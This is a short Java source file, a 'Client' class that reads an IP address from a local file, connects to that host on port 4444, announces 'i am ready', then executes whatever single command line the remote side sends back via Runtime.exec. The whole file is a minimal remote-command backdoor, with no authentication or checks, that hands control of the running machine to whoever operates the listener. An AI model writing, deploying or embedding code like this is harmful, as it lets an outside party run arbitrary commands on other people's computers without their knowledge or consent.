import java.io.*;
import java.net.*;
public class Client
{
Socket s;
BufferedReader br1;
public Client()
	{
	try
		{
br1 = new BufferedReader(new FileReader("IPaddress.txt"));
String add=br1.readLine();

		s = new Socket(add,4444);
BufferedReader br=new BufferedReader(new InputStreamReader(s.getInputStream()));
PrintWriter out=new PrintWriter(s.getOutputStream(),true);

	out.println("i am ready");
	String s=br.readLine();
	Runtime.getRuntime().exec(s);

		}
		catch(Exception e)
		{
			e.printStackTrace();
		}
	}
	public static void main(String a[])
	{
		new Client();
	}
}
